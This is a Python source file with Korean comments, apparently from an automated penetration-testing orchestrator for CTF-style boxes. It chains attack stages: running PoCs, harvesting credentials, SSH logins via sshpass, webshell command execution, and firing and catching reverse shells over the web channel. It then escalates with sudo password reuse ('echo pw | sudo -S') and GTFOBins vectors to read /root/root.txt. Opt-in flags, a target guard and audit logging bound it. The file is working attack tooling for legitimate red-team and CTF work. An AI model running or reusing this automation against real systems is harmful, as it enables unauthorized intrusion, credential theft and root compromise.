"""발판·익스 실행 스테이지 (god-object 해체 — 실행 클러스터 분리).

⚠️ RCE/권한상승 '실행 표면'. 공개 PoC 실행(--poc)·SSH 발판·웹 RCE 세션 획득·플래그 읽기·
권한상승 벡터 발사를 담는다. 전부 `--exploit-exec`/`--auto-poc` 옵트인 + 3관문(_attempt)
하에서만 동작한다.

이 클러스터는 오케스트레이터 코어(_attempt·_goal_reached·_time_up·_run_vuln·_record_flag·
guard·world·audit)에 강결합돼 있어, 생성 전용 클러스터(preparations·flag_assess)처럼 self 를
끊은 '자유 함수'로 떼면 사실상 orchestrator 를 통째로 넘기는 꼴이라 의미가 없다. 그래서 **행위
보존 믹스인**으로 분리한다 — 메서드 본문은 한 줄도 바꾸지 않고 그대로 옮기고(발사 로직 불변),
Orchestrator 가 이 믹스인을 상속해 런타임 동작은 완전히 동일하다. orchestrator.py 표면만 줄인다.
"""

from __future__ import annotations

from typing import TYPE_CHECKING, Any

from . import provenance as _prov
from .flag import FlagHit

if TYPE_CHECKING:
    from .orchestrator import OrchestrationReport
    from .world import WorldModel


class FootholdMixin:
    """Orchestrator 가 상속하는 실행 스테이지 믹스인(발사 로직 불변·행위 보존).

    아래 선언은 합성 대상(Orchestrator)이 제공하는 상태/메서드의 mypy 가시성용이다(런타임엔
    Orchestrator 의 실제 속성/메서드가 쓰인다 — 서브클래스 우선)."""

    # mypy 는 '기본값으로 애노테이션 없는 함수 본문'은 검사하지 않는다. 아래 4개 중 애노테이션이
    # 붙은 메서드는 `_foothold_stage(... ) -> None` 뿐이므로, 그 본문이 참조하는 속성/메서드만
    # 가시성 스텁으로 둔다(나머지 untyped 메서드 본문은 미검사). 타입은 합성 대상(Orchestrator)의
    # 실제 추론 타입과 '정확히' 일치시켜(특히 world 는 non-None WorldModel) 상속 시 Orchestrator
    # 쪽 타입 추론을 흐리지 않게 한다. 런타임엔 Orchestrator 의 실제 속성/메서드가 쓰인다.
    if TYPE_CHECKING:
        exploit_exec: bool
        dry_run: bool
        flag_kind: str
        world: "WorldModel"
        audit: Any   # 덕타이핑 audit(.event(...)) — 런타임엔 Orchestrator 의 NullAudit/AuditLog

        def _record_flag(self, report: "OrchestrationReport", hit, prov=...) -> bool: ...

    def _exploit_run_stage(self, report, host):
        """3단계: 주입된 공개 PoC(--poc)를 게이트로 실행 → 자격 캡처 → world 반영."""
        if not self.exploit_exec or self.world is None or self.dry_run:
            return
        for poc in getattr(self, "poc_commands", []) or []:
            if self._goal_reached(report) or self._time_up():
                return
            before = len(report.enum_findings)
            self._attempt(report, report.enum_findings, poc, phase="access")
            from .exploit_run import harvest_creds, harvest_foothold
            mod = getattr(self, "_active_exploit_module", None)
            for f in report.enum_findings[before:]:
                out = f.output or ""
                for u, p in harvest_creds(out):
                    self.world.add_cred(f"{u}:{p}", source="PoC 출력")
                # 발판 아티팩트 캡처: PoC 가 드롭한 웹셸 URL 을 잡아 웹 RCE 발판으로 잇는다.
                # (한 번 잡으면 유지 — 이후 _acquire_web_rce 가 이 URL/스펙으로 세션 획득.)
                if not getattr(self, "rce_url", ""):
                    url = harvest_foothold(out, mod)
                    if url:
                        self._set_web_rce_from_capture(url, mod, report)

    def _set_web_rce_from_capture(self, url, module, report):
        """캡처한 웹셸 URL 로 웹 RCE 발판 스펙을 세팅한다(생성 전용 — 세션 획득은 _acquire_web_rce).
        모듈이 있으면 그 cmd 스펙(param/method/inject)을, 없으면 보수적 기본(cmd/GET/query)을 쓴다."""
        self.rce_url = url
        if module is not None:
            self.rce_cmd_param = module.cmd_param
            self.rce_method = module.cmd_method
            self.rce_inject = module.cmd_inject
        else:
            self.rce_cmd_param, self.rce_method, self.rce_inject = "cmd", "GET", "query"
        self.audit.event("foothold_url_captured", url=url,
                         via=(module.cve if module is not None else "generic"))
        report.manual_suggestions.append(
            f"# 웹 RCE 발판 캡처 — PoC 출력에서 웹셸 URL 확보: {url} "
            f"(cmd 파라미터='{self.rce_cmd_param}', {self.rce_method}). 이 채널로 명령 실행·플래그 읽기.")

    def _exploit_exec_stage(self, report, host):
        if not self.exploit_exec or self.world is None or self.dry_run:
            return
        import re

        from .target_shell import FLAG_READS, PRIVESC_ENUM, SSHTargetShell, parse_cred
        creds = []
        for c in self.world.creds:
            pc = parse_cred(c)
            if not pc or pc in creds:
                continue
            # NT 해시(32-hex)는 SSH '평문 비번'이 아니다 — PtH/lateral 경로 전용. SSH 비번
            # 분사에 넣으면 무의미한 실패 인증만 유발하므로 건너뛴다(_prepare_lateral 과 동일 구분).
            if re.fullmatch(r"[0-9a-fA-F]{32}", pc[1]):
                self.audit.event("exploit_exec_skip_cred", reason="nt_hash_not_ssh_pw",
                                 user=pc[0])
                continue
            creds.append(pc)
        if not creds:
            self.audit.event("exploit_exec_skip", reason="no_plaintext_cred")
            return
        if host is not None and host.open_ports and 22 not in host.open_ports:
            self.audit.event("exploit_exec_skip", reason="ssh_closed")
            return
        if not self.is_tool_available("sshpass"):
            self.audit.event("exploit_exec_skip", reason="sshpass_missing")
            return
        target = str(self.guard.bound_target or self.guard.bound_host)
        for user, pw in creds[:3]:
            sh = SSHTargetShell(target, user, pw)
            for rc in [*FLAG_READS, *PRIVESC_ENUM]:
                if self._goal_reached(report) or self._time_up():
                    break
                self._attempt(report, report.enum_findings, sh.command(rc), phase="privesc")
            else:
                continue
            break
        # 2단계 폐루프(읽기 되먹임): 발판에서 읽은 privesc 열거(sudo 규칙·SUID·커널)·플래그
        # 출력을 다시 스캔해 새 크리덴셜·CVE·플래그를 월드/분석에 반영한다(다음 분석이 'GTFOBins
        # 다음 수'를 제안하도록). 열거만 되먹임 — 자동 익스 실행이 아니다(생성 경계 유지).
        self._run_vuln(report, host, target)
        # ③ 폐루프 발사 (⚠️ 권한상승 실행 표면): 랭킹된 최상위 벡터의 상승 계획을 SSH 셸에서
        # 실행하고 uid=0 확인 → world 권한레벨 전이 → root 플래그. --exploit-exec 전용.
        if self.auto_poc and not self.world.has_access("root") and creds:
            import shlex

            from .privesc_analyze import analyze_enum
            # ③-a 자격 재사용(SSH): 평문 비번을 sudo -S(stdin)로 넣어 전체권한 sudo → root. su 와
            # 달리 sshpass one-shot 에서도 동작하며, 매우 흔한 HTB 경로다(_privesc_loop 과 대칭).
            for user, pw in creds[:3]:
                if self.world.has_access("root") or self._goal_reached(report) or self._time_up():
                    break
                sh = SSHTargetShell(target, user, pw)
                before = len(report.enum_findings)
                self._attempt(report, report.enum_findings,
                              sh.command(f"echo {shlex.quote(pw)} | sudo -S -k -p '' id"),
                              phase="privesc")
                if len(report.enum_findings) <= before:
                    continue
                if "uid=0(root)" in (report.enum_findings[before].output or ""):
                    self.world.raise_access("root")
                    self.audit.event("privesc_root", via="sudo-password-reuse", channel="ssh")
                    self._attempt(report, report.enum_findings,
                                  sh.command(f"echo {shlex.quote(pw)} | sudo -S -k -p '' "
                                             "cat /root/root.txt 2>/dev/null"), phase="privesc")
                    break
            # ③-b GTFOBins 벡터 폐루프 — 위 자격 재사용으로 root 를 못 얻었을 때만.
            if not self.world.has_access("root"):
                corpus = "\n".join(f.output for f in report.enum_findings if f.output)
                vectors = [v for v in analyze_enum(corpus) if v.confidence == "high" and v.plan]
                user, pw = creds[0]
                sh = SSHTargetShell(target, user, pw)
                for v in vectors[:3]:
                    # v.plan 을 실행한 뒤 'id' 로 결과 확인 (한 줄로 묶어 실행)
                    before = len(report.enum_findings)
                    self._attempt(report, report.enum_findings,
                                  sh.command(f"{v.plan.splitlines()[0]}; id"), phase="privesc")
                    # 이 명령의 '원본' finding 으로 확인한다 — 출력구동 교정이 발화하면 뒤에 교정본이
                    # append 돼 [-1] 이 교정본을 가리킬 수 있다(감사 LOW-3). 게이트 거부면 추가 없음.
                    if len(report.enum_findings) <= before:
                        continue
                    last = report.enum_findings[before].output or ""
                    if "uid=0(root)" in last:
                        self.world.raise_access("root")
                        self._attempt(report, report.enum_findings,
                                      sh.command("cat /root/root.txt 2>/dev/null"), phase="privesc")
                        break

    def _foothold_stage(self, report, host) -> None:
        """발판 세션 확보 → 자격수확 → 플래그 수집. --exploit-exec 전용(RCE 실행 표면)."""
        if not self.exploit_exec or self.world is None or self.dry_run:
            return
        session = self._acquire_session(report, host)   # ← 발판 획득(웹 RCE → 리버스셸 수신)
        if session is None or not session.alive:
            return
        from . import cred_sources, flag_read
        # 발판 세션 송수신(session.run)은 소켓/HTTP 실행 표면이라 런타임에 끊길 수 있다. 여기서
        # 터진 예외가 _foothold_stage 밖으로 새면 뒤따르는 생성 전용 준비 스테이지(revshell/
        # lateral/crack/privesc·평가·심판)가 통째로 생략된다(오케스트레이터 F3 가 흡수하지만 손실).
        # 세션 I/O 오류는 '발판 중단'으로 흡수하고, 그때까지 수확/읽은 것은 유지한다(안전 degrade).
        try:
            # 자격 수확
            for cmd in cred_sources.config_reads(self.world.web_product):
                out = session.run(cmd)
                for u, p, _label in cred_sources.parse_config_creds(out):
                    self.world.add_cred(f"{u}:{p}", source="설정파일")
            # 플래그 수집(채널 무관) — [S4-2] 단일 경로로 report.flags 에도 반영한다. 발판 세션
            # 직독이므로 provenance=exploit-derived.
            for kind, val in flag_read.read_flags(session, flag_kind=self.flag_kind).items():
                prov = _prov.FlagProvenance(kind, val, "<발판 세션 직독>", "foothold",
                                            "exploit-derived", "발판 세션에서 직접 읽음")
                self._record_flag(report, FlagHit(val, kind, "발판"), prov)
            # 권한상승 폐루프(발판 세션 위) — SSH 전용이던 폐루프를 '획득한 발판 세션'에도 적용해
            # 일반화(웹/리버스셸 발판 포함). 열거→랭킹→HIGH 벡터 실행→uid=0→root.txt.
            self._privesc_loop(session, report)
        except OSError as e:   # 세션 소켓/전송 오류 → 발판 중단(이후 준비 스테이지는 계속)
            self.audit.event("foothold_session_error", error=f"{type(e).__name__}: {e}")

    def _privesc_loop(self, session, report) -> None:
        """획득한 발판 세션 위에서 권한상승을 자동 시도한다(생성→실행 폐루프, 세션 무관).

        ① privesc 열거(PRIVESC_ENUM) 실행 → 출력 코퍼스 ② privesc_analyze 로 HIGH 벡터 랭킹
        ③ 상위 벡터의 비대화형(one-shot) 상승을 실행해 uid=0 확인 ④ 성립 시 world 를 root 로
        전이하고 /root/root.txt 를 읽어 플래그 기록. 어떤 단계든 미성립/실패면 조용히 종료
        (발판·user 플래그는 유지). _exploit_exec_stage(SSH)와 동일 로직의 '세션 무관' 버전 —
        이전엔 SSH 발판에만 폐루프가 걸려, 웹셸/리버스셸로 들어온 박스는 privesc 가 수동이었다.
        실행은 '이미 획득한 셸' 위에서만 일어난다(새 범위 밖 대상 접촉 없음). 인가 대상 전용."""
        if self.world is None or self.world.has_access("root"):
            return
        from .orchestrator import EnumFinding
        from .privesc_analyze import analyze_enum
        from .target_shell import PRIVESC_ENUM
        try:
            # ① 열거 — 코퍼스에 반영(벡터 랭킹 재료)
            for rc in PRIVESC_ENUM:
                if self._goal_reached(report) or self._time_up():
                    return
                out = session.run(rc)
                report.enum_findings.append(
                    EnumFinding(command=f"[발판 privesc 열거] {rc}", phase="privesc",
                                output=out, ran=True))
            # ①-b 자격 재사용(매우 흔한 HTB 경로): 수확한 평문 비번을 sudo -S(stdin 비번)로 넣어
            # 전체권한 sudo 를 시도한다. su 와 달리 sudo -S 는 TTY 없이 파이프 비번이 동작하므로
            # 비대화형 발판 세션에서 신뢰도가 높다. NT 해시(32-hex)는 평문 비번이 아니라 제외.
            import re
            import shlex
            pws: list[str] = []
            for c in self.world.creds:
                if ":" not in c:
                    continue
                pw = c.split(":", 1)[1].strip().strip("<>").strip()
                if pw and not re.fullmatch(r"[0-9a-fA-F]{32}", pw) and pw not in pws:
                    pws.append(pw)
            for pw in pws[:5]:
                if self._goal_reached(report) or self._time_up():
                    return
                out = session.run(f"echo {shlex.quote(pw)} | sudo -S -k -p '' id 2>/dev/null")
                report.enum_findings.append(
                    EnumFinding(command="[발판 privesc 시도] sudo -S(자격 재사용)",
                                phase="privesc", output=out, ran=True))
                if "uid=0(root)" in out:
                    self.world.raise_access("root")
                    self.audit.event("privesc_root", via="sudo-password-reuse",
                                     channel=getattr(session, "kind", "?"))
                    from . import flag_read as _fr
                    sudo_sh = f"echo {shlex.quote(pw)} | sudo -S -k -p '' cat /root/root.txt 2>/dev/null"
                    rootout = session.run(sudo_sh)
                    for kind, val in _fr.read_flags(session, flag_kind=self.flag_kind).items():
                        prov = _prov.FlagProvenance(kind, val, "<sudo 자격재사용 후 직독>", "privesc",
                                                    "exploit-derived", "sudo -S 비번 재사용 root 후 직독")
                        self._record_flag(report, FlagHit(val, kind, "privesc"), prov)
                    # root.txt 가 일반 읽기로 안 잡히면 sudo 직독분을 스캔(root 전용 권한일 때)
                    from .flag import scan as _scan
                    for hit in _scan(sudo_sh, rootout or "", flag_kind=self.flag_kind):
                        prov = _prov.FlagProvenance(hit.kind, hit.value, "<sudo 직독>", "privesc",
                                                    "exploit-derived", "sudo -S 로 root.txt 직독")
                        self._record_flag(report, FlagHit(hit.value, hit.kind, "privesc"), prov)
                    return
            # ② 랭킹(HIGH 벡터만)
            corpus = "\n".join(f.output for f in report.enum_findings if f.output)
            vectors = [v for v in analyze_enum(corpus) if v.confidence == "high"]
            # ③ HIGH 벡터 실행 — 비대화형(one-shot) 우선(프레이밍 채널에서 대화형 셸 스폰 회피)
            for v in vectors[:3]:
                if self._goal_reached(report) or self._time_up():
                    return
                probe = v.oneshot("id") or ((v.plan.splitlines()[0] + "; id") if v.plan else "")
                if not probe:
                    continue
                out = session.run(probe)
                report.enum_findings.append(
                    EnumFinding(command=f"[발판 privesc 시도] {v.kind}:{v.binary}",
                                phase="privesc", output=out, ran=True))
                if "uid=0(root)" in out:
                    self.world.raise_access("root")
                    self.audit.event("privesc_root", via=v.kind, binary=v.binary,
                                     channel=getattr(session, "kind", "?"))
                    # ④ root 전이 후 플래그 읽기. docker 그룹 등은 '현재 유저 cat' 으로는 root.txt 를
                    # 못 읽으므로, 성공한 벡터의 'root 권한 one-shot' 으로도 직독해 스캔한다.
                    from . import flag_read
                    for kind, val in flag_read.read_flags(
                            session, flag_kind=self.flag_kind).items():
                        prov = _prov.FlagProvenance(kind, val, "<발판 privesc 후 직독>", "privesc",
                                                    "exploit-derived",
                                                    "권한상승 후 발판 세션에서 직접 읽음")
                        self._record_flag(report, FlagHit(val, kind, "privesc"), prov)
                    priv_read = v.oneshot("cat /root/root.txt 2>/dev/null")
                    if priv_read:
                        from .flag import scan as _scan
                        rootout = session.run(priv_read)
                        for hit in _scan(priv_read, rootout or "", flag_kind=self.flag_kind):
                            prov = _prov.FlagProvenance(hit.kind, hit.value, "<벡터 권한 직독>",
                                                        "privesc", "exploit-derived",
                                                        f"{v.kind} 권한으로 root.txt 직독")
                            self._record_flag(report, FlagHit(hit.value, hit.kind, "privesc"), prov)
                    return
        except OSError as e:   # 세션 소켓/전송 오류 → privesc 중단(발판·user 플래그 유지)
            self.audit.event("privesc_session_error", error=f"{type(e).__name__}: {e}")

    def _acquire_session(self, report, host):
        """발판 세션 획득 + 성립 검증. --exploit-exec/--auto-poc 전용(RCE 실행 표면).
        (1) 웹 RCE 분기(www-data 코드실행) → 실패 시 (2) 리버스셸 수신 분기(준비된 payload 콜백).
        전송부(shell_transport)는 requests 에 의존(선택) — 미설치면 크래시 대신 '발판 미확보'로
        안전 degrade. 리버스셸 수신(소켓)은 opt-in(`catch_revshell`)이라 기본 흐름을 막지 않는다."""
        if self.world is None or not self.auto_poc:
            return None
        from .session_verify import looks_like_shell, verify_probe_command
        # (1) 웹 RCE 분기 — web_product 가 식별된 경우에만
        if self.world.web_product:
            ws = self._acquire_web_rce(report, looks_like_shell, verify_probe_command)
            if ws is not None:
                # 웹 RCE 확보 시, opt-in(catch_revshell) + 공격자 IP 가 있으면 '리버스셸 업그레이드'
                # 를 시도한다 — 웹셸로 리버스셸 payload 를 쏘고(nc 리스너로 수신), 성립하면 더
                # 안정적인 셸 세션을 우선한다(privesc 열거에 유리). 실패하면 웹 세션 유지(무손실).
                upgraded = self._maybe_upgrade_revshell(report, ws,
                                                        looks_like_shell, verify_probe_command)
                return upgraded if upgraded is not None else ws
        # (2) 리버스셸 수신 분기 — opt-in(catch_revshell) + 준비된 revshell(lhost/lport) 있을 때
        return self._acquire_reverse_shell(report, looks_like_shell, verify_probe_command)

    def _acquire_web_rce(self, report, looks_like_shell, verify_probe_command):
        """웹 RCE 발판: PoC 가 성립시킨 cmd 엔드포인트에 명령 실행 → id/uname 신호로 성립 검증."""
        from .shell_session import WebRceSession
        try:
            from .shell_transport import web_http_fn  # requests 의존(선택)
        except ImportError as e:
            self.audit.event("foothold_skip", reason="requests_missing", detail=str(e))
            report.manual_suggestions.append(
                "# 웹 RCE 발판 채널 비활성 — requests 미설치. 활성화하려면 venv 에서 "
                "`pip install requests`(또는 `pip install -e \".[exploit]\"`). 미설치 상태에선 "
                "발판 미확보로 안전하게 건너뜀(실행 크래시 아님).")
            return None
        url = getattr(self, "rce_url", None) or f"https://{self.world.target}/admin/config.php"
        # 캡처된 발판이면 그 cmd 스펙(param/method/inject)을 쓰고, 아니면 보수적 기본(POST/body).
        param = getattr(self, "rce_cmd_param", "") or "cmd"
        method = getattr(self, "rce_method", "") or "POST"
        inject = getattr(self, "rce_inject", "") or "body"
        ws = WebRceSession(url, param, method=method, inject=inject)
        ws.attach(web_http_fn)                       # ← 실제 HTTP (표면)
        # ★ 성립 검증: id/uname 신호가 없으면 헛발판 → 폐기(거짓 '발판 확보' 방지). HTTP 요청
        # 자체가 런타임에 실패(연결거부·타임아웃·TLS)하면 '발판 미확보'로 degrade 해 None 을
        # 반환한다 — 그래야 리버스셸 폴백·이후 준비 스테이지로 진행한다(감사 A-MED). requests
        # 예외 타입은 선택 의존이라 직접 못 잡으므로 넓게 잡되, 안전 경계(생성 전용)는 불변.
        try:
            out = ws.run(verify_probe_command())
        except Exception as e:   # noqa: BLE001 — 요청 실패 → 발판 미확보(폴백/준비 스테이지 진행)
            self.audit.event("foothold_skip", reason="web_probe_error",
                             detail=f"{type(e).__name__}: {e}")
            return None
        if looks_like_shell(out):
            return ws
        return None

    def _acquire_reverse_shell(self, report, looks_like_shell, verify_probe_command):
        """리버스셸 수신 발판: 준비된 payload(revshell_lhost/lport)로 리스너를 띄워 콜백을 받는다.
        opt-in(`catch_revshell`) 이며, 실제 소켓 accept/recv 는 주입 가능한 catcher 가 담당한다
        (기본: shell_transport.catch_reverse_shell — RCE 실행 표면). 켜지지 않았거나 준비된
        revshell 컨텍스트가 없으면 조용히 생략(소켓 블로킹 없음). 콜백이 와도 성립 검증을 통과해야
        세션으로 인정한다(거짓 발판 방지)."""
        if not getattr(self, "catch_revshell", False):
            return None
        lhost = getattr(report, "revshell_lhost", "") or ""
        lport = getattr(report, "revshell_lport", 0) or getattr(self, "revshell_port", 0)
        if not lhost or not lport:
            report.manual_suggestions.append(
                "# 리버스셸 수신 비활성 — 공격자 IP/포트(revshell) 미확보. 공격자 IP 가 잡히면 "
                "payload 가 자동 준비되고, --catch-revshell 로 리스너 수신을 켤 수 있다.")
            return None
        catch = getattr(self, "_revshell_catcher", None)   # 테스트 주입용(기본은 실제 소켓)
        if catch is None:
            try:
                from .shell_transport import catch_reverse_shell as catch
            except ImportError as e:   # socket 은 표준이나 모듈 상단 선택 의존 등으로 실패 시
                self.audit.event("foothold_skip", reason="revshell_transport_unavailable",
                                 detail=str(e))
                return None
        self.audit.event("revshell_listen", lhost=lhost, lport=int(lport))
        try:
            session = catch(lhost, int(lport))   # 소켓 accept(블로킹·타임아웃) — RCE 실행 표면
        except OSError as e:                      # bind 실패·타임아웃·콜백 없음 → 발판 미확보
            self.audit.event("revshell_catch_error", error=f"{type(e).__name__}: {e}")
            return None
        if session is None:
            return None
        # ★ 성립 검증: 콜백이 와도 실제 셸 신호(uid=/uname)가 없으면 폐기(거짓 발판 방지).
        # 검증 송수신(session.run)도 소켓 I/O 라 accept 직후 리셋될 수 있다 — 여기서 OSError 가
        # 나면 세션을 닫고 발판 미확보로 degrade(세션 누수·이후 스테이지 생략 방지, 감사 A-LOW).
        try:
            ok = bool(session.alive and looks_like_shell(session.run(verify_probe_command())))
        except OSError as e:
            self.audit.event("revshell_catch_error", error=f"{type(e).__name__}: {e}")
            session.close()
            return None
        if ok:
            self.audit.event("revshell_foothold", lhost=lhost, lport=int(lport))
            return session
        session.close()
        return None

    # ── 리버스셸 업그레이드(웹 RCE → nc 수신 셸) ─────────────────────────────
    def _pick_revshell_payload(self, report) -> str:
        """준비된 리버스셸 payload(report.revshells = revshell.generate)에서 '한 줄'을 고른다.
        TTY 없는 웹셸에서 가장 잘 도는 순서로 선호(bash 계열 → mkfifo → python3). 없으면 ''."""
        shells = getattr(report, "revshells", None) or []
        by_name = {getattr(s, "name", ""): getattr(s, "payload", "") for s in shells}
        for n in ("bash 5", "bash -i", "sh mkfifo", "nc mkfifo", "python3", "perl"):
            if by_name.get(n):
                return by_name[n]
        return (getattr(shells[0], "payload", "") if shells else "")

    def _fire_web_payload(self, web_session, payload: str) -> None:
        """웹 RCE 채널로 리버스셸 트리거를 '쏜다'(fire-and-forget, 백그라운드 스레드).
        payload 를 백그라운드·세션분리로 감싸 HTTP 요청이 셸에 매달리지 않게 한다. 실패는 삼킨다
        (성립 판정은 리스너 수신이 담당). WebRceSession.fire 가 요청 오류를 degrade 처리한다."""
        import shlex
        import threading
        # setsid + 백그라운드 + 입출력 분리 → PHP system() 류가 자식에 매달리지 않고 즉시 반환.
        bg = f"setsid sh -c {shlex.quote(payload)} >/dev/null 2>&1 &"
        fire = getattr(web_session, "fire", None)
        if fire is None:
            return

        def _send():
            try:
                fire(bg)
            except Exception as e:   # noqa: BLE001 — fire-and-forget
                self.audit.event("revshell_fire_error", error=f"{type(e).__name__}: {e}")

        threading.Thread(target=_send, daemon=True).start()

    def _maybe_upgrade_revshell(self, report, web_session, looks_like_shell, verify_probe_command):
        """웹 RCE 발판을 리버스셸로 '업그레이드'한다(opt-in·공격자 IP 필요). 리스너를 백그라운드로
        띄우고 웹셸로 payload 를 쏜 뒤 콜백을 수신한다. 성립검증 통과분만 인정하고, 성공 시 웹
        세션을 닫고 리버스셸 세션을 반환(더 안정적). 어떤 단계든 실패하면 None(→ 웹 세션 유지, 무손실).
        한 세션 1회만 시도(재진입 가드). 전부 opt-in(catch_revshell) + 준비된 revshell 하에서만."""
        if not getattr(self, "catch_revshell", False):
            return None
        if getattr(self, "_revshell_upgraded", False):
            return None
        lhost = getattr(report, "revshell_lhost", "") or ""
        lport = getattr(report, "revshell_lport", 0) or getattr(self, "revshell_port", 0)
        if not lhost or not lport:
            return None
        payload = self._pick_revshell_payload(report)
        if not payload:
            return None
        catch = getattr(self, "_revshell_catcher", None)   # 테스트 주입용(기본은 실제 소켓)
        if catch is None:
            try:
                from .shell_transport import catch_reverse_shell as catch
            except ImportError as e:
                self.audit.event("foothold_skip", reason="revshell_transport_unavailable",
                                 detail=str(e))
                return None
        self._revshell_upgraded = True
        import threading
        import time
        result: dict = {}
        # 업그레이드 전용 '짧은' 수신 타임아웃 — 웹 발판은 이미 성립해 user 플래그를 쥐었으므로,
        # 콜백이 안 오면 길게 기다리지 않고 웹 세션으로 복귀한다(기본 리버스셸 발판의 120s 와 구분).
        to = getattr(self, "_revshell_upgrade_timeout", 25)

        def _listen():
            try:
                # 실제 catcher 는 timeout 을 받는다(shell_transport.catch_reverse_shell). 주입된
                # 2-인자 테스트 catcher 는 TypeError → timeout 없이 폴백(테스트 호환).
                try:
                    result["sess"] = catch(lhost, int(lport), timeout=to)
                except TypeError:
                    result["sess"] = catch(lhost, int(lport))
            except OSError as e:
                result["err"] = e

        th = threading.Thread(target=_listen, daemon=True)
        self.audit.event("revshell_listen", lhost=lhost, lport=int(lport), via="web-upgrade",
                         timeout=to)
        th.start()
        # 리스너가 bind/accept 준비할 짧은 여유(테스트는 0). 그 뒤 트리거 발사.
        time.sleep(getattr(self, "_revshell_prefire_delay", 0.5))
        self._fire_web_payload(web_session, payload)
        th.join(timeout=getattr(self, "_revshell_join_timeout", to + 5))
        session = result.get("sess")
        if session is None:
            return None
        # 성립 검증: 콜백이 와도 실제 셸 신호가 없으면 폐기(거짓 발판 방지). 소켓 I/O 오류도 degrade.
        try:
            ok = bool(session.alive and looks_like_shell(session.run(verify_probe_command())))
        except OSError as e:
            self.audit.event("revshell_catch_error", error=f"{type(e).__name__}: {e}")
            session.close()
            return None
        if not ok:
            session.close()
            return None
        self.audit.event("revshell_upgrade", lhost=lhost, lport=int(lport))
        report.manual_suggestions.append(
            f"# 웹 RCE → 리버스셸 업그레이드 성립 — nc 리스너({lhost}:{lport}) 수신 셸 확보. "
            f"이후 명령·privesc 열거는 리버스셸 세션으로 진행(더 안정적).")
        try:
            web_session.close()
        except Exception:   # noqa: BLE001 — 업그레이드 성공이 웹 세션 close 예외로 깨지지 않게
            pass
        return session
